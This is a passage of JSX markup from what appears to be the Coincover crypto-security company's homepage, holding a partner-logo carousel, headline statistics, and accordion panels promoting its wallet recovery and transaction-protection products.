                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Cobo.svg"
                                            alt="Cobo"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Coincall.svg"
                                            alt="Coincall"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Coins.ph.svg"
                                            alt="Coins.ph"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Copper.svg"
                                            alt="Copper"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Cumberland%20DRW.svg"
                                            alt="Cumberland DRW"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Deribit.svg"
                                            alt="Deribit"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/FalconX.svg"
                                            alt="FalconX"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Figment.svg"
                                            alt="Figment"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Fireblocks-1.svg"
                                            alt="Fireblocks"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Flipster.svg"
                                            alt="Flipster"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/ForDeFI.svg"
                                            alt="ForDeFI"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Gate.io.svg"
                                            alt="Gate.io"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Gemini.svg"
                                            alt="Gemini"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Griffin%20Gaming%20Partners.svg"
                                            alt="Griffin Gaming Partners"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Halborn.svg"
                                            alt="Halborn"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/HTX.svg"
                                            alt="HTX"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Immutable.svg"
                                            alt="Immutable"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Kiln.svg"
                                            alt="Kiln"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Ledger.svg"
                                            alt="Ledger"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Ledn.svg"
                                            alt="Ledn"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Longrun.svg"
                                            alt="Longrun"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Moonpay.svg"
                                            alt="Moonpay"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Netcoins.svg"
                                            alt="Netcoins"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Newton.svg"
                                            alt="Newton"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Nexo-1.svg"
                                            alt="Nexo-1"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Onramp.svg"
                                            alt="Onramp"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Optimism.svg"
                                            alt="Optimism"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Pantera.svg"
                                            alt="Pantera"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Phantom.svg"
                                            alt="Phantom"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Ribbit.svg"
                                            alt="Ribbit"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Ripple-1.svg"
                                            alt="Ripple-1"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Shakepay.svg"
                                            alt="Shakepay"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Shift%20Markets.svg"
                                            alt="Shift Markets"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Squads.svg"
                                            alt="Squads"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Stacks%20Foundation.svg"
                                            alt="Stacks Foundation"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Tribe.svg"
                                            alt="Tribe"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Utila.svg"
                                            alt="Utila"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Van%20Eck.svg"
                                            alt="Van Eck"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/Wirex.svg"
                                            alt="Wirex"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                        <div className="logo_slide normal_image">
                                          <img
                                            src="https://www.coincover.com/hubfs/zerohash.svg"
                                            alt="zerohash"
                                            loading="lazy"
                                            width={203}
                                            height={100}
                                            style={{
                                              maxWidth: "100%",
                                              height: "auto"
                                            }}
                                          />
                                        </div>
                                      </div>
                                    </div>
                                    <div className="slider-container height_h3">
                                      <div className="swiper vertical-swiper">
                                        <div className="swiper-wrapper">
                                          <div className="swiper-slide">
                                            <h3>550+ businesses safeguarded</h3>
                                          </div>
                                          <div className="swiper-slide">
                                            <h3>
                                              22 million wallets protected
                                            </h3>
                                          </div>
                                          <div className="swiper-slide">
                                            <h3>
                                              $72 billion of transactions
                                              secured
                                            </h3>
                                          </div>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-5 dnd_area-row-2-force-full-width-section dnd-section">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-6 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1748079879244"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="parallax-section">
                              <div className="parallax-image-wrapper">
                                <div
                                  className="parallax-image"
                                  style={{
                                    backgroundImage:
                                      'url("https://www.coincover.com/hubfs/Woman_Parralax%20image.png")'
                                  }}
                                />
                              </div>
                            </div>
                          </div>
                        </div>
                        {/*end widget-span */}
                      </div>
                      {/*end row*/}
                    </div>
                    {/*end row-wrapper */}
                  </div>
                  {/*end widget-span */}
                </div>
                {/*end row*/}
              </div>
              {/*end row-wrapper */}
              <div className="row-fluid-wrapper row-depth-1 row-number-7 dnd-section dnd_area-row-3-force-full-width-section">
                <div className="row-fluid ">
                  <div
                    className="span12 widget-span widget-type-cell dnd-column"
                    style={{}}
                    data-widget-type="cell"
                    data-x={0}
                    data-w={12}
                  >
                    <div className="row-fluid-wrapper row-depth-1 row-number-8 dnd-row">
                      <div className="row-fluid ">
                        <div
                          className="span12 widget-span widget-type-custom_widget dnd-module"
                          style={{}}
                          data-widget-type="custom_widget"
                          data-x={0}
                          data-w={12}
                        >
                          <div
                            id="hs_cos_wrapper_widget_1748079916602"
                            className="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module"
                            style={{}}
                            data-hs-cos-general-type="widget"
                            data-hs-cos-type="module"
                          >
                            <div className="hs_animatedLogoContent_AndAccordion">
                              <div className="top-pane">
                                <div className="hs_animatedLogoContent scroll-section">
                                  <div className="content-wrapper">
                                    <div className="center-box">
                                      <span className="dot top-left" />
                                      <span className="dot top-right" />
                                      <span className="dot bottom-left" />
                                      <span className="dot bottom-right" />
                                      <div className="inner_content_group stage text-stage stage-3">
                                        <h2>
                                          We understand the risks behind digital
                                          assets.
                                        </h2>
                                        <p>
                                          Our battle-hardened tech is the answer
                                          – rock-solid security to keep you in
                                          control. <br />
                                          Backed by our team of agile,
                                          cool-headed problem-solvers.
                                        </p>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                              <div className="bottom-pane">
                                <div className="accordion-main-wrapper">
                                  <div className="accordion-container">
                                    <div className="accordion-item">
                                      <div className="accordion-header">
                                        <div className="logo-title">
                                          <div className="logo-container">
                                            <div className="company-name">
                                              <img
                                                src="https://www.coincover.com/hubfs/CC%20Recover%20for%20Institutions_black.svg"
                                                alt="CC Recover for Institutions_black"
                                                loading="lazy"
                                                width={525}
                                                height={24}
                                                style={{
                                                  maxWidth: "100%",
                                                  height: "auto"
                                                }}
                                              />
                                            </div>
                                          </div>
                                        </div>
                                        <div className="toggle-icon">
                                          <svg
                                            className="icon-plus"
                                            width={20}
                                            height={20}
                                            viewBox="0 0 20 20"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <g clipPath="url(#clip0_2088_78641)">
                                              <path
                                                d="M9.01562 18.5172C9.01562 17.98 9.44804 17.5345 9.99838 17.5345C10.5356 17.5345 10.9811 17.98 10.9811 18.5172C10.9811 19.0676 10.5356 19.5 9.99838 19.5C9.44804 19.5 9.01562 19.0676 9.01562 18.5172ZM9.01562 14.2586C9.01562 13.7214 9.44804 13.2759 9.99838 13.2759C10.5356 13.2759 10.9811 13.7214 10.9811 14.2586C10.9811 14.7959 10.5356 15.2414 9.99838 15.2414C9.44804 15.2414 9.01562 14.7959 9.01562 14.2586ZM9.01562 10C9.01562 9.46276 9.44804 9.01724 9.99838 9.01724C10.5356 9.01724 10.9811 9.46276 10.9811 10C10.9811 10.5372 10.5356 10.9828 9.99838 10.9828C9.44804 10.9828 9.01562 10.5372 9.01562 10ZM9.01562 5.74138C9.01562 5.20414 9.44804 4.75862 9.99838 4.75862C10.5356 4.75862 10.9811 5.20414 10.9811 5.74138C10.9811 6.27862 10.5356 6.72414 9.99838 6.72414C9.44804 6.72414 9.01562 6.27862 9.01562 5.74138ZM9.01562 1.48276C9.01562 0.945517 9.44804 0.5 9.99838 0.5C10.5356 0.5 10.9811 0.945517 10.9811 1.48276C10.9811 2.02 10.5356 2.46552 9.99838 2.46552C9.44804 2.46552 9.01562 2.02 9.01562 1.48276Z"
                                                fill="#0E171B"
                                              />
                                              <path
                                                d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                fill="#0E171B"
                                              />
                                            </g>
                                            <defs>
                                              <clipPath id="clip0_2088_78641">
                                                <rect
                                                  width={19}
                                                  height={19}
                                                  fill="white"
                                                  transform="translate(0.5 0.5)"
                                                />
                                              </clipPath>
                                            </defs>
                                          </svg>
                                          <svg
                                            className="icon-minus"
                                            width={20}
                                            height={20}
                                            viewBox="0 0 20 20"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <g clipPath="url(#clip0_2088_73497)">
                                              <path
                                                d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                fill="white"
                                              />
                                            </g>
                                            <defs>
                                              <clipPath id="clip0_2088_73497">
                                                <rect
                                                  width={19}
                                                  height={19}
                                                  fill="white"
                                                  transform="translate(0.5 0.5)"
                                                />
                                              </clipPath>
                                            </defs>
                                          </svg>
                                        </div>
                                      </div>
                                      <div className="accordion-body">
                                        <h6>Wallet disaster recovery.</h6>
                                        <p>Get back in control, 24/7.</p>
                                        <p>
                                          Hot and cold storage and cool-headed
                                          human support.
                                        </p>
                                        <p>
                                          If the worst happens, we’ll take
                                          decisive action to help put you back
                                          in control of your wallet.
                                        </p>
                                        <p>&nbsp;</p>
                                        <div className="btn-wrapper">
                                          <a
                                            className="blue_btn_with_arrow"
                                            href="https://www.coincover.com/products/recover-for-institutions"
                                          >
                                            <span>Learn More</span>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="accordion-item">
                                      <div className="accordion-header">
                                        <div className="logo-title">
                                          <div className="logo-container">
                                            <div className="company-name">
                                              <img
                                                src="https://www.coincover.com/hubfs/Coincover_April2025_CTA9/images/Coincover_protect.svg"
                                                alt="Coincover_protect"
                                                loading="lazy"
                                                width={302}
                                                height={25}
                                                style={{
                                                  maxWidth: "100%",
                                                  height: "auto"
                                                }}
                                              />
                                            </div>
                                          </div>
                                        </div>
                                        <div className="toggle-icon">
                                          <svg
                                            className="icon-plus"
                                            width={20}
                                            height={20}
                                            viewBox="0 0 20 20"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <g clipPath="url(#clip0_2088_78641)">
                                              <path
                                                d="M9.01562 18.5172C9.01562 17.98 9.44804 17.5345 9.99838 17.5345C10.5356 17.5345 10.9811 17.98 10.9811 18.5172C10.9811 19.0676 10.5356 19.5 9.99838 19.5C9.44804 19.5 9.01562 19.0676 9.01562 18.5172ZM9.01562 14.2586C9.01562 13.7214 9.44804 13.2759 9.99838 13.2759C10.5356 13.2759 10.9811 13.7214 10.9811 14.2586C10.9811 14.7959 10.5356 15.2414 9.99838 15.2414C9.44804 15.2414 9.01562 14.7959 9.01562 14.2586ZM9.01562 10C9.01562 9.46276 9.44804 9.01724 9.99838 9.01724C10.5356 9.01724 10.9811 9.46276 10.9811 10C10.9811 10.5372 10.5356 10.9828 9.99838 10.9828C9.44804 10.9828 9.01562 10.5372 9.01562 10ZM9.01562 5.74138C9.01562 5.20414 9.44804 4.75862 9.99838 4.75862C10.5356 4.75862 10.9811 5.20414 10.9811 5.74138C10.9811 6.27862 10.5356 6.72414 9.99838 6.72414C9.44804 6.72414 9.01562 6.27862 9.01562 5.74138ZM9.01562 1.48276C9.01562 0.945517 9.44804 0.5 9.99838 0.5C10.5356 0.5 10.9811 0.945517 10.9811 1.48276C10.9811 2.02 10.5356 2.46552 9.99838 2.46552C9.44804 2.46552 9.01562 2.02 9.01562 1.48276Z"
                                                fill="#0E171B"
                                              />
                                              <path
                                                d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                fill="#0E171B"
                                              />
                                            </g>
                                            <defs>
                                              <clipPath id="clip0_2088_78641">
                                                <rect
                                                  width={19}
                                                  height={19}
                                                  fill="white"
                                                  transform="translate(0.5 0.5)"
                                                />
                                              </clipPath>
                                            </defs>
                                          </svg>
                                          <svg
                                            className="icon-minus"
                                            width={20}
                                            height={20}
                                            viewBox="0 0 20 20"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <g clipPath="url(#clip0_2088_73497)">
                                              <path
                                                d="M17.5345 9.99838C17.5345 9.46114 17.9669 9.01562 18.5172 9.01562C19.0545 9.01562 19.5 9.46114 19.5 9.99838C19.5 10.5356 19.0545 10.9811 18.5172 10.9811C17.9669 10.9811 17.5345 10.5356 17.5345 9.99838ZM13.2759 9.99838C13.2759 9.46114 13.7083 9.01562 14.2586 9.01562C14.7959 9.01562 15.2414 9.46114 15.2414 9.99838C15.2414 10.5356 14.7959 10.9811 14.2586 10.9811C13.7083 10.9811 13.2759 10.5356 13.2759 9.99838ZM9.01724 9.99838C9.01724 9.46114 9.44966 9.01562 10 9.01562C10.5372 9.01562 10.9828 9.46114 10.9828 9.99838C10.9828 10.5356 10.5372 10.9811 10 10.9811C9.44966 10.9811 9.01724 10.5356 9.01724 9.99838ZM4.75862 9.99838C4.75862 9.46114 5.20414 9.01562 5.74138 9.01562C6.27862 9.01562 6.72414 9.46114 6.72414 9.99838C6.72414 10.5356 6.27862 10.9811 5.74138 10.9811C5.20414 10.9811 4.75862 10.5356 4.75862 9.99838ZM0.5 9.99838C0.5 9.46114 0.932414 9.01562 1.48276 9.01562C2.02 9.01562 2.46552 9.46114 2.46552 9.99838C2.46552 10.5356 2.02 10.9811 1.48276 10.9811C0.932414 10.9811 0.5 10.5356 0.5 9.99838Z"
                                                fill="white"
                                              />
                                            </g>
                                            <defs>
                                              <clipPath id="clip0_2088_73497">
                                                <rect
                                                  width={19}
                                                  height={19}
                                                  fill="white"
                                                  transform="translate(0.5 0.5)"
                                                />
                                              </clipPath>
                                            </defs>
                                          </svg>
                                        </div>
                                      </div>
                                      <div className="accordion-body">
                                        <h6>
                                          Provide total protection for your
                                          customers’ digital assets
                                        </h6>
                                        <p>
                                          We monitor accounts in real-time, and
                                          scan every transaction for malicious
                                          activity.
                                        </p>
                                        <p>
                                          If a customer loses money because our
                                          tech fails to spot fraud – we’ll make
                                          it right.
                                        </p>
                                        <p>&nbsp;</p>
                                        <div className="btn-wrapper">
                                          <a
                                            className="blue_btn_with_arrow"
                                            href="https://www.coincover.com/products/protect"
                                          >
                                            <span>Learn More</span>
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                    <div className="accordion-item">
                                      <div className="accordion-header">
                                        <div className="logo-title">
                                          <div className="logo-container">
                                            <div className="company-name">
                                              <img
                                                src="https://www.coincover.com/hubfs/CC%20Recover_black.svg"
                                                alt="CC Recover_black"
                                                loading="lazy"
                                                width={316}
                                                height={24}
                                                style={{
                                                  maxWidth: "100%",
                                                  height: "auto"
                                                }}
                                              />
                                            </div>
                                          </div>
                                        </div>
                                        <div className="toggle-icon">
                                          <svg
                                            className="icon-plus"
                                            width={20}
                                            height={20}
                                            viewBox="0 0 20 20"
                                            fill="none"
                                            xmlns="http://www.w3.org/2000/svg"
                                          >
                                            <g clipPath="url(#clip0_2088_78641)">
                                              <path
                                                d="M9.01562 18.5172C9.01562 17.98 9.44804 17.5345 9.99838 17.5345C10.5356 17.5345 10.9811 17.98 10.9811 18.5172C10.9811 19.0676 10.5356 19.5 9.99838 19.5C9.44804 19.5 9.01562 19.0676 9.01562 18.5172ZM9.01562 14.2586C9.01562 13.7214 9.44804 13.2759 9.99838 13.2759C10.5356 13.2759 10.9811 13.7214 10.9811 14.2586C10.9811 14.7959 10.5356 15.2414 9.99838 15.2414C9.44804 15.2414 9.01562 14.7959 9.01562 14.2586ZM9.01562 10C9.01562 9.46276 9.44804 9.01724 9.99838 9.01724C10.5356 9.01724 10.9811 9.46276 10.9811 10C10.9811 10.5372 10.5356 10.9828 9.99838 10.9828C9.44804 10.9828 9.01562 10.5372 9.01562 10ZM9.01562 5.74138C9.01562 5.20414 9.44804 4.75862 9.99838 4.75862C10.5356 4.75862 10.9811 5.20414 10.9811 5.74138C10.9811 6.27862 10.5356 6.72414 9.99838 6.72414C9.44804 6.72414 9.01562 6.27862 9.01562 5.74138ZM9.01562 1.48276C9.01562 0.945517 9.44804 0.5 9.99838 0.5C10.5356 0.5 10.9811 0.945517 10.9811 1.48276C10.9811 2.02 10.5356 2.46552 9.99838 2.46552C9.44804 2.46552 9.01562 2.02 9.01562 1.48276Z"
                                                fill="#0E171B"
                                              />
                                              <path
